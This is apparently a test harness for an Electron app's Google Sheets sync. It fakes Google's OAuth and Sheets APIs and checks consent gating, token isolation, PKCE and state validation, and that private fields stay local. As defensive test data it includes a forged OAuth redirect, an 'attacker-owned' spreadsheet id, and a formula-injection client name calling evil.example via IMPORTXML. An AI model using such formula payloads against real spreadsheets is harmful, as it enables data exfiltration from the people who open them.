/**
 * The Google spreadsheet the app keeps as a copy of its database.
 *
 * Google is played by this script: its token endpoint, its Sheets API (which
 * refuses a write that does not fit the grid, as the real one does), and a
 * person in the browser who signs in, refuses, or knocks with the wrong
 * answer. Nothing here reaches the internet - a request for any other host is
 * answered 503 and counted, and the count must end at nothing.
 *
 * The checks that matter most are about refusal: that nothing goes before GD
 * has switched it on and linked GD's own account, that a page can neither
 * hand the app a token nor name a spreadsheet, and that what stays on this
 * machine - dates of birth, addresses, the notes on the Client page - stays.
 */
const http = require('node:http');
const crypto = require('node:crypto');
const { app, BrowserWindow, shell } = require('electron');
require('./fresh.js').freshUserData(app);
const db = require('../electron/db.js');

const SCOPE = 'https://www.googleapis.com/auth/drive.file';
const AUTH = 'https://accounts.google.com/o/oauth2/v2/auth';
const DELAY = Number(process.env.GD_TEST_SHEETS_DELAY_MS ?? 8000);

/* ------------------------------------------------------------ the browser */

const opened = [];
const browser = { mode: 'allow', knocks: [], last: null };

function knock(url) {
  return new Promise((resolve) => {
    http.get(url, { agent: false }, (res) => { res.resume(); resolve(res.statusCode); })
      .on('error', (err) => resolve(err.code === 'ECONNREFUSED' ? 'refused' : err.code));
  });
}

/** A person at the consent page: a stray knock first, then their answer. */
async function signIn(url) {
  const asked = new URL(url);
  browser.last = asked;
  const redirect = asked.searchParams.get('redirect_uri');
  const state = asked.searchParams.get('state');
  if (browser.mode === 'none') return;
  const code = `code-${++fake.n}`;
  fake.codes.set(code, { challenge: asked.searchParams.get('code_challenge'), redirect });
  browser.knocks.push(await knock(`${redirect}/?code=forged&state=not-the-state`));
  const answer = browser.mode === 'deny'
    ? `${redirect}/?error=access_denied&state=${encodeURIComponent(state)}`
    : `${redirect}/?code=${code}&state=${encodeURIComponent(state)}`;
  browser.knocks.push(await knock(answer));
}

shell.openExternal = async (url) => {
  opened.push(String(url));
  if (String(url).startsWith(AUTH)) setTimeout(() => signIn(String(url)), 20);
  return true;
};

/* ----------------------------------------------------------------- Google */

const fake = {
  n: 0,
  calls: [],            // { host, method, path, status, grant }
  stray: [],
  codes: new Map(),
  refresh: new Set(),
  access: new Set(),
  revoked: [],
  pkce: [],
  grantScope: SCOPE,
  books: new Map(),
  valueInputs: [],
  requests: [],         // the structural requests of every :batchUpdate
};

const json = (status, body) => new Response(JSON.stringify(body), {
  status, headers: { 'Content-Type': 'application/json' },
});
const b64url = (buf) => Buffer.from(buf).toString('base64url');
const colNumber = (letters) => [...letters].reduce((n, ch) => n * 26 + ch.charCodeAt(0) - 64, 0);

function tabMeta(t) {
  return { properties: { sheetId: t.sheetId, title: t.title, gridProperties: { rowCount: t.rows, columnCount: t.cols, frozenRowCount: t.frozen } } };
}

function parseRange(range) {
  const m = /^'([^']+)'!([A-Z]+)(\d+)(?::([A-Z]+)(\d+))?$/.exec(range);
  if (!m) return null;
  return { title: m[1], col: colNumber(m[2]), row: Number(m[3]), toCol: m[4] ? colNumber(m[4]) : null, toRow: m[5] ? Number(m[5]) : null };
}

function tokenEndpoint(form) {
  if (form.get('grant_type') === 'authorization_code') {
    const issued = fake.codes.get(form.get('code'));
    fake.codes.delete(form.get('code'));
    if (!issued || issued.redirect !== form.get('redirect_uri')) return json(400, { error: 'invalid_grant' });
    const matches = b64url(crypto.createHash('sha256').update(form.get('code_verifier') ?? '').digest()) === issued.challenge;
    fake.pkce.push(matches);
    if (!matches) return json(400, { error: 'invalid_grant' });
    const rt = `rt-secret-${++fake.n}`;
    const at = `at-secret-${++fake.n}`;
    fake.refresh.add(rt);
    fake.access.add(at);
    return json(200, { access_token: at, refresh_token: rt, expires_in: 3599, scope: fake.grantScope, token_type: 'Bearer' });
  }
  if (form.get('grant_type') === 'refresh_token') {
    if (!fake.refresh.has(form.get('refresh_token'))) return json(400, { error: 'invalid_grant', error_description: 'Token has been expired or revoked.' });
    const at = `at-secret-${++fake.n}`;
    fake.access.add(at);
    return json(200, { access_token: at, expires_in: 3599, scope: SCOPE, token_type: 'Bearer' });
  }
  return json(400, { error: 'unsupported_grant_type' });
}

function sheetsEndpoint(method, path, body) {
  if (method === 'POST' && path === '/v4/spreadsheets') {
    const id = `1Sheet${String(++fake.n).padStart(4, '0')}abcdefghijklmnop`;
    const tabs = (body.sheets ?? []).map((s, i) => ({
      sheetId: 100 + i, title: s.properties.title,
      rows: s.properties.gridProperties?.rowCount ?? 1000,
      cols: s.properties.gridProperties?.columnCount ?? 26,
      frozen: s.properties.gridProperties?.frozenRowCount ?? 0, values: [],
    }));
    fake.books.set(id, { id, title: body.properties?.title, tabs });
    return json(200, { spreadsheetId: id, spreadsheetUrl: `https://docs.google.com/spreadsheets/d/${id}/edit`, sheets: tabs.map(tabMeta) });
  }
  const m = /^\/v4\/spreadsheets\/([^/:]+)(:batchUpdate|\/values:batchUpdate|\/values:batchClear)?$/.exec(path);
  const book = m && fake.books.get(m[1]);
  if (!book) return json(404, { error: { code: 404, message: 'Requested entity was not found.' } });
  const find = (title) => book.tabs.find((t) => t.title === title);

  if (method === 'GET' && !m[2]) return json(200, { sheets: book.tabs.map(tabMeta) });

  if (m[2] === ':batchUpdate') {
    fake.requests.push(...body.requests);
    for (const r of body.requests) {
      if (r.addSheet) {
        const p = r.addSheet.properties;
        book.tabs.push({ sheetId: 200 + (++fake.n), title: p.title, rows: p.gridProperties.rowCount, cols: p.gridProperties.columnCount, frozen: p.gridProperties.frozenRowCount ?? 0, values: [] });
      } else if (r.updateSheetProperties) {
        const p = r.updateSheetProperties.properties;
        const t = book.tabs.find((x) => x.sheetId === p.sheetId);
        if (!t) return json(400, { error: { message: 'No grid with id' } });
        t.rows = p.gridProperties.rowCount;
        t.cols = p.gridProperties.columnCount;
      }
    }
    return json(200, body.includeSpreadsheetInResponse ? { updatedSpreadsheet: { sheets: book.tabs.map(tabMeta) } } : {});
  }

  if (m[2] === '/values:batchUpdate') {
    fake.valueInputs.push(body.valueInputOption);
    // Checked first and applied after, as Google does: a write that does not
    // fit is refused whole.
    for (const d of body.data) {
      const r = parseRange(d.range);
      const t = r && find(r.title);
      if (!t) return json(400, { error: { message: `Unable to parse range: ${d.range}` } });
      const width = Math.max(0, ...d.values.map((row) => row.length));
      if (r.row - 1 + d.values.length > t.rows || r.col - 1 + width > t.cols) {
        return json(400, { error: { message: `Range ('${t.title}'!${d.range}) exceeds grid limits.` } });
      }
    }
    for (const d of body.data) {
      const r = parseRange(d.range);
      const t = find(r.title);
      d.values.forEach((row, i) => {
        const old = t.values[r.row - 1 + i] ?? [];
        t.values[r.row - 1 + i] = [...row, ...old.slice(row.length)];
      });
    }
    return json(200, { totalUpdatedRows: body.data.reduce((n, d) => n + d.values.length, 0) });
  }

  if (m[2] === '/values:batchClear') {
    for (const range of body.ranges) {
      const r = parseRange(range);
      const t = r && find(r.title);
      if (!t) return json(400, { error: { message: `Unable to parse range: ${range}` } });
      for (let i = r.row - 1; i < Math.min(t.values.length, r.toRow ?? r.row); i++) t.values[i] = [];
    }
    return json(200, { clearedRanges: body.ranges });
  }
  return json(400, { error: { message: 'Not part of this fake.' } });
}

global.fetch = async (input, opts = {}) => {
  const url = new URL(String(input));
  const method = (opts.method ?? 'GET').toUpperCase();
  const call = { host: url.host, method, path: url.pathname, status: 0, grant: null };
  fake.calls.push(call);
  let res;
  if (url.host === 'oauth2.googleapis.com' && url.pathname === '/token') {
    const form = new URLSearchParams(opts.body);
    call.grant = form.get('grant_type');
    res = tokenEndpoint(form);
  } else if (url.host === 'oauth2.googleapis.com' && url.pathname === '/revoke') {
    const token = new URLSearchParams(opts.body).get('token');
    fake.revoked.push(token);
    fake.refresh.delete(token);
    res = json(200, {});
  } else if (url.host === 'sheets.googleapis.com') {
    const bearer = /^Bearer (.+)$/.exec(opts.headers?.Authorization ?? '')?.[1];
    res = fake.access.has(bearer)
      ? sheetsEndpoint(method, url.pathname, opts.body ? JSON.parse(opts.body) : undefined)
      : json(401, { error: { code: 401, status: 'UNAUTHENTICATED' } });
  } else {
    fake.stray.push(String(input));
    res = json(503, {});
  }
  call.status = res.status;
  return res;
};

require('../electron/main.js');
const { TABS } = require('../electron/sheetsMirror.js');

/* ------------------------------------------------------------------ checks */

let pass = 0, fail = 0;
const log = (...a) => process.stdout.write(a.join(' ') + '\n');
const check = (ok, label, detail = '') => { ok ? (pass++, log('  ✓', label)) : (fail++, log('  ✗ FAIL:', label, detail)); };
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
async function until(test, ms = 5000) {
  const end = Date.now() + ms;
  while (Date.now() < end) { if (await test()) return true; await wait(50); }
  return false;
}

const book = () => [...fake.books.values()][0];
const tab = (title) => book()?.tabs.find((t) => t.title === title);
const rowsOf = (title) => (tab(title)?.values ?? []).filter((r) => r.some((c) => c !== '' && c !== null && c !== undefined));
const writes = () => fake.calls.filter((c) => c.path.endsWith('/values:batchUpdate') && c.status === 200).length;
const sheetsCalls = () => fake.calls.filter((c) => c.host === 'sheets.googleapis.com').length;

app.whenReady().then(async () => {
  await wait(2400);
  const win = BrowserWindow.getAllWindows()[0];
  const js = (c) => win.webContents.executeJavaScript(c);
  const call = (ch, arg) => js(`window.gd.${ch}(${JSON.stringify(arg ?? {})}).then(r => JSON.stringify(r.ok ? { data: r.data } : { error: r.error.message }))`).then(JSON.parse);
  const get = async () => (await call('connections.get')).data;
  const linked = async () => (await get()).secrets.googleRefreshToken.present;

  log('=== nothing leaves before GD says so ===');
  // An earlier version took a pasted spreadsheet link. That spreadsheet is
  // not one the app made, so it is not written to.
  db.setSetting('integrations', { consent: false, sheets: { enabled: true, spreadsheetId: '1PastedInAnEarlierVersion0123456' } });
  check((await get()).config.sheets.spreadsheetId === '', 'a spreadsheet pasted in an earlier version is not the one written to');
  await call('secrets.set', { name: 'googleClientId', value: 'test-client.apps.googleusercontent.com' });
  await call('secrets.set', { name: 'googleClientSecret', value: 'test-client-secret' });
  let r = await call('connections.link');
  check(/switch on/i.test(r.error ?? ''), 'linking is refused while sending is switched off', JSON.stringify(r));
  check(opened.length === 0 && fake.calls.length === 0, 'and neither the browser nor Google was asked', JSON.stringify({ opened, calls: fake.calls.length }));

  r = await call('secrets.set', { name: 'googleRefreshToken', value: 'rt-from-a-page' });
  check(!!r.error, 'a page cannot hand the app an account token', JSON.stringify(r));
  check(!(await linked()), '  and none is saved');

  let state = (await call('connections.set', {
    consent: true,
    sheets: { enabled: true, when: 'onSave', spreadsheetId: '1AttackerOwnedSheet0123456789' },
  })).data;
  check(state.config.sheets.spreadsheetId === '', 'a page cannot name the spreadsheet the copy goes to', state.config.sheets.spreadsheetId);
  r = await call('settings.set', { key: 'integrations', value: { consent: true, sheets: { enabled: true, spreadsheetId: '1AttackerOwnedSheet0123456789' } } });
  state = await get();
  check(!!r.error && state.config.sheets.spreadsheetId === '', '  nor reach the setting behind it directly', JSON.stringify(r));
  check(state.config.sheets.when === 'onSave' && state.config.consent, '  while what a page may set is still set');

  r = await call('sheets.create');
  check(/not linked/i.test(r.error ?? ''), 'no spreadsheet is made before an account is linked', JSON.stringify(r));
  check(state.status.sheets.why === 'Google account not linked yet.', '  and the page says what is missing', state.status.sheets.why);
  check(fake.calls.length === 0, 'nothing has reached Google yet', String(fake.calls.length));

  log('\n=== linking the account, in the browser ===');
  browser.mode = 'deny';
  r = await call('connections.link');
  check(/not given permission/.test(r.error ?? ''), 'refused at Google, nothing is linked', JSON.stringify(r));
  check(!(await linked()), '  and no token is kept');

  browser.mode = 'allow';
  fake.grantScope = 'openid email';
  r = await call('connections.link');
  check(/files this app makes/.test(r.error ?? ''), 'a link without access to the app\'s own files is not kept', JSON.stringify(r));
  check(!(await linked()), '  and no token is kept');
  check(fake.revoked.length === 1 && fake.revoked[0].startsWith('rt-secret-'), '  nor left valid at Google', JSON.stringify(fake.revoked));
  fake.grantScope = SCOPE;

  browser.knocks = [];
  r = await call('connections.link');
  check(!r.error && r.data.secrets.googleRefreshToken.present, 'allowed at Google, the account is linked', JSON.stringify(r.error));
  const asked = browser.last;
  check(`${asked.origin}${asked.pathname}` === AUTH, 'the browser opens Google\'s own consent page', asked.origin);
  check(asked.searchParams.get('scope') === SCOPE, '  asking only for the files the app makes', asked.searchParams.get('scope'));
  check(asked.searchParams.get('code_challenge_method') === 'S256' && (asked.searchParams.get('code_challenge') ?? '').length >= 43,
    '  with a PKCE challenge');
  check((asked.searchParams.get('state') ?? '').length >= 32, '  and a random state', asked.searchParams.get('state'));
  check(/^http:\/\/127\.0\.0\.1:\d+$/.test(asked.searchParams.get('redirect_uri') ?? ''), '  answered on 127.0.0.1 alone', asked.searchParams.get('redirect_uri'));
  check(browser.knocks[0] === 400 && browser.knocks[1] === 200, 'a knock with the wrong state is turned away, and the real answer taken', JSON.stringify(browser.knocks));
  check(fake.pkce.at(-1) === true, 'the code is exchanged with the verifier that matches the challenge', JSON.stringify(fake.pkce));
  check(await knock(asked.searchParams.get('redirect_uri')) === 'refused', 'and the listener is closed once linked');
  const raw = await js(`window.gd.connections.get().then(r => JSON.stringify(r))`);
  check(!/rt-secret|at-secret/.test(raw), 'no token crosses to the page');
  check(r.data.secrets.googleRefreshToken.hint === '', '  not even its last four characters', r.data.secrets.googleRefreshToken.hint);
  check(r.data.status.sheets.needs === 'spreadsheet' && !r.data.status.sheets.ready, 'linked, the one thing left is the spreadsheet', JSON.stringify(r.data.status.sheets));

  log('\n=== a blank spreadsheet, made and filled by the app ===');
  const thabo = (await call('clients.save', {
    name: 'Thabo', surname: 'Test', contact: '000 000 0001', email: 'thabo@example.com',
    dob: '1990-02-03', postalAddress: '12 Hidden Lane MARKER-ADDRESS',
  })).data;
  const formula = '=IMPORTXML("https://evil.example/x","//a")';
  const evil = (await call('clients.save', { name: formula, surname: 'Formula', contact: '000 000 0002', email: 'f@example.com' })).data;
  const order = (await call('projects.create', { clientId: thabo, title: 'Wedding suit', eventType: 'wedding', eventDate: '2026-12-12' })).data;
  await call('payments.add', { projectId: order, amount: 2500, paidOn: '2026-10-01', method: 'EFT' });
  await call('extras.add', { projectId: order, extraType: 'Tie', colour: 'Navy' });
  await call('alterations.add', { projectId: order, description: 'Shorten sleeves' });
  await call('notes.add', { projectId: order, step: 'consult', body: 'MARKER-NOTE private', author: 'GD' });
  await wait(DELAY + 300);
  check(sheetsCalls() === 0, 'with no spreadsheet yet, changes send nothing', String(sheetsCalls()));

  let before = fake.calls.length;
  r = await call('sheets.create');
  check(!r.error && fake.books.size === 1, 'Make the spreadsheet makes one', JSON.stringify(r.error));
  check(r.data?.config.sheets.spreadsheetId === book()?.id, '  and the app keeps its id', r.data?.config.sheets.spreadsheetId);
  check(JSON.stringify(book().tabs.map((t) => t.title)) === JSON.stringify(TABS.map((t) => t.title)),
    '  with a tab for each table', JSON.stringify(book().tabs.map((t) => t.title)));
  check(TABS.every((t) => JSON.stringify(tab(t.title).values[0]) === JSON.stringify(t.columns) && tab(t.title).frozen === 1),
    '  each headed with its columns, the header row frozen');
  check(rowsOf('Clients').length === 3 && rowsOf('Orders').length === 2 && rowsOf('Payments').length === 2
    && rowsOf('Alterations').length === 2 && rowsOf('Extras').length === 2,
    '  and filled: a row per record', JSON.stringify(TABS.map((t) => rowsOf(t.title).length)));
  const made = fake.calls.slice(before).filter((c) => c.host === 'sheets.googleapis.com').map((c) => `${c.method} ${c.path.replace(/^\/v4\/spreadsheets\/?[^/:]*/, '')}`);
  check(made.length <= 4, 'made and filled in four calls', JSON.stringify(made));
  check(rowsOf('Clients').some((row) => row.includes(formula)) && fake.valueInputs.every((v) => v === 'RAW'),
    'a name that looks like a formula is written as text', JSON.stringify(fake.valueInputs));
  const everything = JSON.stringify(book().tabs.map((t) => t.values));
  check(!/MARKER-ADDRESS|MARKER-NOTE|1990-02-03/.test(everything), 'addresses, dates of birth and the Client page notes stay on this machine');
  const headers = book().tabs.flatMap((t) => t.values[0]);
  check(!headers.some((h) => /dob|postal|secondary|minor|measure_|spec|quote_json|form_url|changes|profile/.test(h)),
    '  and no column for them is made', JSON.stringify(headers.filter((h) => /dob|postal|secondary|minor|spec|quote|form_url|changes|profile/.test(h))));
  check(r.data?.sheets?.ok === true && r.data.sheets.rows.Clients === 2, 'the page is told when it was written, and how much', JSON.stringify(r.data?.sheets));
  check(r.data?.status.sheets.ready === true, '  and Sheets is ready', JSON.stringify(r.data?.status.sheets));
  before = fake.calls.length;
  r = await call('sheets.create');
  check(/already made/.test(r.error ?? '') && fake.books.size === 1 && fake.calls.length === before,
    'a second spreadsheet is not made while the first is there', JSON.stringify(r));
  const hosts = (await call('app.security')).data.networkHosts;
  check(hosts.includes('sheets.googleapis.com') && hosts.includes('oauth2.googleapis.com'), 'Settings lists Google among the places data goes', JSON.stringify(hosts));

  log('\n=== a few seconds after anything changes ===');
  let w = writes();
  for (const name of ['Thabo1', 'Thabo2', 'Thabo3']) await call('clients.patch', { id: thabo, patch: { name } });
  await until(() => writes() > w);
  await wait(DELAY * 3);
  check(writes() === w + 1, 'three quick edits are one write', String(writes() - w));
  check(rowsOf('Clients').some((row) => row.includes('Thabo3')), '  carrying the last of them');

  before = fake.calls.length;
  await call('settings.set', { key: 'theme', value: 'light' });
  await wait(DELAY * 3);
  check(fake.calls.length === before, 'a change that is not in the copy sends nothing at all', JSON.stringify(fake.calls.slice(before)));

  w = writes();
  before = fake.calls.length;
  await call('clients.delete', { id: evil });
  await until(() => writes() > w);
  await wait(200);
  check(rowsOf('Clients').length === 2 && !rowsOf('Clients').some((row) => row.includes(formula)),
    'a deleted client leaves no row behind', JSON.stringify(rowsOf('Clients')));
  const steps = fake.calls.slice(before).filter((c) => c.host === 'sheets.googleapis.com');
  check(steps.length === 3, '  in three calls: read the tabs, write, clear what is left', JSON.stringify(steps.map((c) => `${c.method} ${c.path}`)));

  w = writes();
  before = fake.calls.length;
  for (let i = 0; i < 40; i++) {
    await call('clients.save', { name: `Bulk${i}`, surname: 'Client', contact: `000 111 ${String(i).padStart(4, '0')}`, email: '' });
  }
  await until(() => writes() > w);
  await wait(DELAY * 3);
  check(rowsOf('Clients').length === 42, 'forty new clients reach the spreadsheet', String(rowsOf('Clients').length));
  const bulk = fake.calls.slice(before).filter((c) => c.host === 'sheets.googleapis.com').length;
  check(bulk <= 12, '  in a few writes, not a call per client', `${bulk} calls, ${writes() - w} writes`);

  log('\n=== when the spreadsheet or Google changes under it ===');
  fake.access.clear();
  w = writes();
  before = fake.calls.length;
  await call('clients.patch', { id: thabo, patch: { name: 'Thabo4' } });
  await until(() => writes() > w);
  const sequence = fake.calls.slice(before).map((c) => c.grant ?? c.status);
  check(sequence.includes(401) && sequence.includes('refresh_token') && rowsOf('Clients').some((row) => row.includes('Thabo4')),
    'an access token Google turned down is refreshed and the write goes through', JSON.stringify(sequence));

  tab('Clients').rows = 5;
  r = await call('sheets.write');
  check(!r.error && rowsOf('Clients').length === 42, 'a tab too small for the rows is grown first', JSON.stringify(r.error));
  check(fake.requests.some((q) => q.updateSheetProperties), '  by asking Google to grow it');

  book().tabs = book().tabs.filter((t) => t.title !== 'Orders');
  r = await call('sheets.write');
  check(!r.error && tab('Orders') && rowsOf('Orders').length === 2, 'a tab deleted in the spreadsheet is made again', JSON.stringify(r.error));

  const kept = book();
  fake.books.delete(kept.id);
  r = await call('sheets.write');
  state = await get();
  check(/no longer in this Google account/.test(r.error ?? ''), 'a spreadsheet deleted in Google is reported, not retried for ever', JSON.stringify(r));
  check(state.sheets?.ok === false && state.sheets.code === 'missing', '  and the page can offer to make a new one', JSON.stringify(state.sheets));
  r = await call('sheets.create');
  const remade = book();
  check(!r.error && fake.books.size === 1 && remade.id !== kept.id && r.data.config.sheets.spreadsheetId === remade.id
    && rowsOf('Clients').length === 42, '  which is made, kept and filled', JSON.stringify(r.error));

  log('\n=== switched off, nothing goes ===');
  await call('connections.set', { consent: false });
  before = fake.calls.length;
  await call('clients.patch', { id: thabo, patch: { name: 'Thabo5' } });
  await wait(DELAY * 3);
  r = await call('sheets.write');
  check(!!r.error && fake.calls.length === before, 'with sending switched off, neither a change nor Write now reaches Google',
    JSON.stringify(fake.calls.slice(before)));
  await call('connections.set', { consent: true });
  await until(() => rowsOf('Clients').some((row) => row.includes('Thabo5')));
  check(rowsOf('Clients').some((row) => row.includes('Thabo5')), 'switched on again, what changed meanwhile is written');

  log('\n=== when Google lets the link go ===');
  fake.refresh.clear();
  fake.access.clear();
  await call('clients.patch', { id: thabo, patch: { name: 'Thabo6' } });
  await until(async () => !(await linked()));
  state = await get();
  check(!state.secrets.googleRefreshToken.present && state.status.sheets.why === 'Google account not linked yet.',
    'a link Google refuses is forgotten here too, and the page says so', JSON.stringify(state.status.sheets));
  check(state.sheets?.ok === false, '  with the failed write on record');

  r = await call('connections.link');
  check(!r.error && r.data.status.sheets.ready, 'linked again, the same spreadsheet is ready', JSON.stringify(r.error));

  log('\n=== different application details are a different application ===');
  const rtNow = [...fake.refresh].at(-1);
  await call('secrets.set', { name: 'googleClientId', value: 'test-client.apps.googleusercontent.com' });
  check(await linked(), 'saving the same client id again keeps the link');
  await call('secrets.set', { name: 'googleClientId', value: 'another-client.apps.googleusercontent.com' });
  check(!(await linked()), 'a different client id unlinks the account');
  await until(() => fake.revoked.includes(rtNow), 2000);
  check(fake.revoked.includes(rtNow), '  and asks Google to forget the old link');
  await call('secrets.set', { name: 'googleClientId', value: 'test-client.apps.googleusercontent.com' });
  r = await call('connections.link');
  const rtLast = [...fake.refresh].at(-1);
  r = await call('connections.unlink');
  check(!r.error && !r.data.secrets.googleRefreshToken.present && fake.revoked.includes(rtLast), 'Unlink forgets the account here and at Google', JSON.stringify(r.error));
  r = await call('connections.link');
  check(!r.error, '  and it can be linked again', JSON.stringify(r.error));

  log('\n=== opening it ===');
  opened.length = 0;
  await call('sheets.open');
  check(opened[0] === `https://docs.google.com/spreadsheets/d/${remade.id}/edit`, 'Open in Google Sheets opens the one the app made', opened[0]);

  log('\n=== the page GD uses ===');
  win.webContents.reload(); await wait(2400);
  w = writes();
  const ui = JSON.parse(await js(`(async () => {
    const wait = ms => new Promise(r => setTimeout(r, ms));
    [...document.querySelectorAll('.nav-item')].find(b => b.textContent.includes('Settings')).click(); await wait(900);
    const tab = [...document.querySelectorAll('.step-tab')].find(t => t.textContent.trim() === 'Connections');
    if (!tab) return JSON.stringify({ tab: false });
    tab.click(); await wait(700);
    const card = [...document.querySelectorAll('.card')].find(c => c.querySelector('.card-head h3')?.textContent.trim() === 'Google Sheets');
    const labels = [...card.querySelectorAll('label')].map(l => l.textContent.trim());
    const inputs = card.querySelectorAll('input:not([type="checkbox"])').length;
    const before = card.querySelector('[data-sheets-written]')?.textContent ?? '';
    card.querySelector('[data-sheets="write"]')?.click();
    await wait(900);
    const after = card.querySelector('[data-sheets-written]')?.textContent ?? '';
    const summary = [...document.querySelectorAll('.collapsible-head, summary, .collapsible button, button')]
      .find(e => e.textContent.includes('Google account details'));
    summary?.click(); await wait(400);
    return JSON.stringify({
      tab: true, labels, inputs, before, after,
      open: !!card.querySelector('[data-sheets="open"]'),
      write: !!card.querySelector('[data-sheets="write"]'),
      create: !!card.querySelector('[data-sheets="create"]'),
      unlink: !!document.querySelector('[data-google="unlink"]'),
    });
  })()`));
  check(ui.tab, 'Settings has the Connections page');
  check(ui.open && ui.write && !ui.create, 'the Sheets card offers Open and Write now once the spreadsheet is made', JSON.stringify(ui));
  check(!ui.labels.includes('Spreadsheet') && !ui.labels.includes('Which tab') && ui.inputs === 0,
    '  and nowhere to paste a spreadsheet or name a tab', JSON.stringify({ labels: ui.labels, inputs: ui.inputs }));
  check(/^Last written .+: 41 clients, 1 orders\.$/.test(ui.after), '  it says when it last wrote, and how much', ui.after);
  check(writes() === w + 1, 'pressing Write now writes', String(writes() - w));
  check(ui.unlink, 'the Google account details show it is linked, with Unlink');

  check(fake.stray.length === 0, 'and nothing went anywhere but Google', JSON.stringify(fake.stray));

  log(`\n${fail === 0 ? 'ALL SHEETS CHECKS PASSED' : 'FAILED'} — ${pass} passed, ${fail} failed`);
  app.exit(fail === 0 ? 0 : 1);
}).catch((e) => { log('HARNESS FAIL', e.stack); app.exit(1); });
